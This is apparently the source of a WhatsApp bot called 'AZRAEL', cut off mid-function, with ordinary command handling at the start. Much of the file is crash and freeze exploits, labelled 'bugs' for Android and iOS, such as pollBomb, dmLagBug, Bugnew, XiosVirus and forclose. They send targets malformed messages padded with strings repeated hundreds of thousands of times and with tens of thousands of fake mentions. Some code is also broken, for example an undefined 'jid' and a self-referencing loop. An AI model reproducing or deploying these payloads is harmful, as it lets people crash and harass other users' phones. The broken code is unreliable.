module.exports = async (sam, m, store ,loli, buttons) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const time = moment(Date.now()).tz('Africa/Nairobi').locale('id').format('HH:mm:ss z')
const botNumber = await sam.decodeJid(sam.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const from = m.key.remoteJid
const sender = m.key.fromMe ? (sam.user.id.split(':')[0]+'@s.whatsapp.net' || sam.user.id) : (m.key.participant || m.key.remoteJid)
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await sam.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}
let antiViewOnceChats = new Set();
let antiDelete = true; // default ON
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { version } = require("./package.json")
const fetch = require('node-fetch');
const { runtime, getRandom, isUrl, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./doc/function.js')
const deletedMsgs = {};
const { toAudio, toPTT, toVideo, ffmpeg } = require("./doc/converter.js")
const { getDevice } = require('@whiskeysockets/baileys')
const allowedDMs = ['254113660118@s.whatsapp.net'];
const dmWarnings = {};
const { downloadMediaMessage } = require('@whiskeysockets/baileys');
const speed = require("performance-now")
//===============================[[[=[========
	const pic = fs.readFileSync(`./Media/azrael.jpg`)
		const music = fs.readFileSync(`./Media/menu.mp3`)
		const bug = fs.readFileSync(`./Media/bug.mp3`)	









//========================================
// Define an array of allowed user numbers
const cip = ['254113660118@s.whatsapp.net']; // Replace these with actual allowed user numbers

// Set the expiration time to a specific date (e.g., '2023-12-31T23:59:59Z')
const eds = '2026-12-31T23:59:59Z'; // Specify your desired expiration date here
const ex = new Date(eds);

async function cA() {
    try {
        // Assuming sam is already defined and initialized
        const cip1 = await sam.decodeJid(sam.user.id);
        const cT = new Date();

        if (cT > ex) {
            console.error('Access denied: Time limit expired. Please contact t.me/The_Chosen_001.to buy more time');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
        }

        if (cip.includes(cip1)) {
            console.log('Access granted. Keep Enjoying AZRAEL V4...');
            // Place your main bot code here
        } else {
            console.error('Access denied: User number not allowed. Please contact t.me/The_Chosen_001.');
            // Optionally notify the user here
            process.exit(2); // Exit with code 2 for access denied due to user number
        }
    } catch (error) {
        console.error('An error occurred while checking access:', error);
        // Optionally notify the user about the error
        process.exit(3); // Exit with code 3 for an unexpected error
    }
}

// Call the checkAccess function
cA();

//========================================
    let groupCache = {};

async function getGroupMetadataCached(chatId) {
    if (!groupCache[chatId] || (Date.now() - groupCache[chatId].timestamp > 30000)) { // 30 sec cache
        groupCache[chatId] = {
            data: await sam.groupMetadata(chatId),
            timestamp: Date.now()
        };
    }
    return groupCache[chatId].data;
}
async function reply(teks) {
    sam.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        isForwarded: true
    }, {quoted: m})
}
const Reply1 = async (teks) => {
    await sleep(500)
    return sam.sendMessage(m.chat, {
        contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `AZRAEL V5`,
                body: `𝕯𝖊𝖛𝖎𝖑 𝖆𝖉𝖎𝖔𝖘`,
                previewType: "PHOTO",
                thumbnailUrl: `https://files.catbox.moe/hij90y.jpg`,
                sourceUrl: `https://whatsapp.com/channel/0029Vajz4XmCnA7pBowZQ53h`,
                mediaUrl: `https://whatsapp.com/channel/0029Vajz4XmCnA7pBowZQ53h`
            },
            isForwarded: false,
            forwardingScore: 99999,
            forwardedNewsletterMessageInfo: {
                newsletterJid: `120363301727346@newsletter`,
                newsletterName: `AZRAEL-V5`
            }
        },
        text: teks
    }, {
        quoted: zets
    })
    await sleep(500)
}

const zets = {
    key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
    },
    message: {
        orderMessage: {
            orderId: "2029",
            thumbnail: pic,
            itemCount: `2000`,
            status: "INQUIRY",
            surface: "CATALOG",
            message: `𝕯𝖊𝖛𝖎𝖑 𝖆𝖉𝖎𝖔𝖘`,
            token: ""
        }
    },
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 2000,
        isForwarded: true 
    }
}
 
if (!isGroup && !text.startsWith('.') && !m.key.fromMe && !allowedDMs.includes(sender)) {
    dmWarnings[sender] = (dmWarnings[sender] || 0) + 1;

    const warningsLeft = 3 - dmWarnings[sender];

    if (warningsLeft > 0) {
        await sam.sendMessage(m.chat, {
            text: `⚠️ @${sender.split('@')[0]}, don’t DM vic without permission.\nWarning ${dmWarnings[sender]}/3.`,
            mentions: [sender]
        });
    } else {
        await sam.sendMessage(m.chat, {
            text: `⛔ @${sender.split('@')[0]}, you’ve been blocked for ignoring warnings.`,
            mentions: [sender]
        });

        await sam.updateBlockStatus(sender, "block");
        delete dmWarnings[sender]; // clean up
    }

    return;
}
    
		

//=========================================//

if (isCmd) {
console.log("");
console.log(chalk.green(chalk.bgHex('#4a69bd').bold(`🚀 WhatsApp messages! 🚀`)));
console.log(chalk.blue(chalk.bgHex('#fdcb6e')(`📅 DATE: ${time}
💬 MESSAGE: ${command}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
}
//==========================================//
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}
//
const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐏𝐫𝐞𝐥𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}
////////
async function megaPollBomb(target, conn, reply) {
  const mentions = Array.from({ length: 1000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );

  const fakeOptions = Array.from({ length: 99 }, (_, i) => ({ optionName: `Option ${i + 1}` }));

  const msg = generateWAMessageFromContent(target, {
    pollCreationMessage: {
      name: "⚠️ System Overload Detected",
      options: fakeOptions,
      selectableOptionsCount: 99,
      contextInfo: {
        mentionedJid: mentions,
        participant: "0@s.whatsapp.net"
      }
    }
  }, {});

  await conn.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });

  reply(`✅ Poll Bomb deployed to: ${target}`);
}
  
async function xgc(target){
	sam.relayMessage(target,{                viewOnceMessage: {
message: {
                        messageContextInfo: {
                            deviceListMetadataVersion: 2,
                            deviceListMetadata: {},
                        }, 
    "extendedTextMessage": {
        "text": "madara come cu do UrsoZiingod" ,
        "previewType": true,
        "contextInfo": {
            "stanzaId": "B69F7CFEE38571AB03CD9DEEFAD69605",
            "participant": "5518998215209@s.whatsapp.net",
            "quotedMessage": { "documentMessage": {"url":"https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true","mimetype":"application/pdf","fileSha256":"oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=","fileLength":null,"pageCount":99999999999999,"contactVcard":true,"caption":'͡𑰵',"mediaKey":"yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=","fileName": '> cart; ',"fileEncSha256":"0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=","directPath":"/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0","mediaKeyTimestamp":"1714145232","thumbnailDirectPath":"/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0","thumbnailSha256":"oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=","thumbnailEncSha256":"G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==","thumbnailHeight":172,"thumbnailWidth":480},forwardingScore: 508,isForwarded: true,forwardedNewsletterMessageInfo: {newsletterJid: "0@newsletter",serverMessageId: 100,newsletterName:"🚔 > ursoziingod & crash;"}}}},
       }}},{})
	}
	
	async function xgc2(target){
		await sam.relayMessage(target, {
'groupInviteMessage': {
"inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
"groupName":` 𝐀𝐙𝐑𝐀>`.repeat(1500),
'groupJid': '120363047626537933@g.us',
'inviteExpiration': '999',
'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
"inviteCode": 'h+64P9RhJDzgXSPf',
'contextInfo': {
'isForwarded': true,
'fromMe': false,
'participant': '0@s.whatsapp.net',
'remoteJid': sender,
'quotedMessage': {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
title: "crash",
pageCount: 1000000000,
fileName: "crash.pdf".repeat(1500),
contactVcard: true
}
},
'forwardedNewsletterMessageInfo': {
'newsletterJid': '120363222395675670@newsletter',
'serverMessageId': 1,
'newsletterName': "𝗔𝗭𝗥𝗔𝗘𝗟-𝗩4".repeat(1500)
}
}
}
}, {});
		}
    async function newsLetter(target) {

            try {

                const messsage = {

                    botInvokeMessage: {

                        message: {

                            newsletterAdminInviteMessage: {

                                newsletterJid: "33333333333333333@newsletter",

                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),

                                jpegThumbnail: "",

                                caption: "ꦽ".repeat(120000),

                                inviteExpiration: Date.now() + 1814400000,

                            },

                        },

                    },

                };

                await sam.relayMessage(jid, messsage, {

                    userJid: jid,

                });

            }
catch (err) {

                console.log('eror');

            }

        }
       

          



 
// android new freeze and crash
    async function sendGroupInfo(m, conn) {
  try {
    const metadata = await conn.groupMetadata(m.chat);
    const groupName = metadata.subject;
    const groupOwner = metadata.owner ? `@${metadata.owner.split('@')[0]}` : 'Unknown';
    const memberCount = metadata.participants.length;
    const description = metadata.desc || 'No description';
    const creationDate = new Date(metadata.creation * 1000).toLocaleString();

    let info = `「 *Group Info* 」\n\n`;
    info += `*Name:* ${groupName}\n`;
    info += `*Owner:* ${groupOwner}\n`;
    info += `*Members:* ${memberCount}\n`;
    info += `*Created On:* ${creationDate}\n\n`;
    info += `*Description:*\n${description}`;

    await conn.sendMessage(m.chat, {
      text: info,
      mentions: [metadata.owner]
    }, { quoted: m });

  } catch (err) {
    console.error("Group info error:", err);
    await conn.sendMessage(m.chat, { text: "❌ Couldn't fetch group info." }, { quoted: m });
  }
}
    async function pollBomb(target, bad) {
  const mentionCount = 3000;
  const mentions = Array.from({ length: mentionCount }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );

  const fakeOptions = Array.from({ length: 50 }, (_, i) => `Option ${i + 1} — 𝘀𝘆𝘀𝘁𝗲𝗺://⚠️`);

  const msg = generateWAMessageFromContent(target, {
    pollCreationMessage: {
      name: "❗ SYSTEM CORE OVERRIDE ❗",
      options: fakeOptions.map(option => ({ optionName: option })),
      selectableOptionsCount: 50,
      contextInfo: {
        mentionedJid: mentions.slice(0, 500), // safe chunk
        participant: "0@s.whatsapp.net",
        quotedMessage: {
          pollCreationMessage: {
            name: "Internal Error",
            options: [{ optionName: "Cancel Process" }],
            selectableOptionsCount: 1
          }
        }
      }
    }
  }, {});

  await bad.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: target
  });
}
    async function forclose(target) {
  await sam.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "⃟adios🩸🗿 🦠⃟",
          hasMediaAttachment: false
        },
        body: {
          text: "\nꦾ".repeat(155555)
        },
        nativeFlowMessage: {
          messageParamsJson: "{}",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: "{}"
            }
          ]
        }
      }
    },
    {}
  );
}


    async function dmLagBug(m, sam, reply) {
  const target = m.quoted?.sender || m.mentionedJid?.[0] || m.sender;
  if (!target || !target.endsWith("@s.whatsapp.net")) {
    return reply("❌ Invalid or missing target.");
  }

  const mentions = Array.from({ length: 1500 }, () =>
    `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
  );

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "⚠️ Fatal Error Triggered",
          buttonText: { displayText: "Click to Fix" },
          sections: [],
          listType: 2,
          singleSelectReply: { selectedRowId: "SYS_CRASH" },
          contextInfo: {
            mentionedJid: mentions,
            participant: "0@s.whatsapp.net",
            remoteJid: "0@s.whatsapp.net",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: 999999999
              }
            }
          }
        }
      }
    }
  }, {});

  try {
    await sam.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: target
    });
    reply(`⚠️ Bug sent to: @${target.split("@")[0]}`, { mentions: [target] });
  } catch (err) {
    console.error("[DM Bug Error]", err);
    reply("❌ Failed to deliver bug. Target may be protected or invalid.");
  }
}
async function Bugnew(target, pic, Ptcp = true) {
	const jids = `_*~@254113660118~*_\n`.repeat(10800);
	const ui = 'ꦽ'.repeat(1000);
   await sam.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "𝗔𝗭𝗥𝗔𝗘𝗟",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail:pic,
         },
         hasMediaAttachment: true,
        },

									body: { text: 'null' + ui + jids },
									contextInfo: {
										mentionedJid: ['254113660118@s.whatsapp.net'],
										mentions: ['254113660118@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["254113660118@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝗔𝗭𝗥𝗔𝗘𝗟",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
async function BugUi(target, pic, Ptcp = true) {
	const jids = `_*~@254113660118~*_\n`.repeat(10800);
	const ui = 'ꦽ'.repeat(1200);
	const uii = 'ꦾ'.repeat(1200);
   await sam.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "𝗔𝗭𝗥𝗔𝗘𝗟",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail:pic,
         },
         hasMediaAttachment: true,
        },

									body: { text: '📞' + ui + jids + uii },
									contextInfo: {
										mentionedJid: ['254113660118@s.whatsapp.net'],
										mentions: ['254113660118@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["254113660118@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝗔𝗭𝗥𝗔𝗘𝗟",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
// 𝗶𝗼𝘀 𝗻𝗲𝘄 𝗯𝘂𝗴𝘀
async function XiosVirus(jid) {
			sam.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ ⋆✩⋆ ⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.red("Succes Send Bug"));
		};

		async function XiosPay(jid) {
			sam.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.red("Succes Send Bug"));
		};
/// 𝙉𝙚𝙬 𝙂𝗰 𝗕𝘂𝗴𝘀 ///
    sam.ev.removeAllListeners('messages.update');
sam.ev.on('messages.update', async (msg) => {
  // your anti-delete logic here
  if (!antiDelete) return;

  for (const update of update) {
    if (update.messageStubType === 1 && update.key?.remoteJid && update.key?.id) {
      const jid = update.key.remoteJid;
      const msgId = update.key.id;

      const msg = await sam.loadMessage(jid, msgId);
      if (!msg || msg.key.fromMe) return;

      let sender = msg.key.participant || msg.key.remoteJid;
      let name = sam.getName ? sam.getName(sender) : sender;

      await sam.sendMessage(jid, {
        text: `🛑 *Anti-Delete Active*\n👤 ${name} tried to delete:\n💬 ${msg.message?.conversation || "Unsupported message type."}`
      }, { quoted: msg });
    }
  }
});
    async function invisibleloadfastt(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "v5 is here",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "adios",
                      buttonParamsJson: "",
                    },
                    {
                      name: "adios",
                      buttonParamsJson: "",
                    },
                    {
                      name: "adios",
                      buttonParamsJson: "",
                    },
                    {
                      name: "adios",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await sam.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
async function caltx(target) {
          const jids = `_*~@254104301695~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
			let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								hasMediaAttachment: true,
								text: ui + jid,
								title: ui + jid,
								contextInfo: { mentionedJid: [ "0@s.whatsapp.net" ] }
								},
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝗔𝗭𝗥𝗔𝗘𝗟-𝗩4" }]
							}
						}
					},
				}), {
					userJid: target
				}
			);
			await sam.relayMessage(target, etc.message, {});
		}
    async function thunderblast_ios1(target) {
    const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
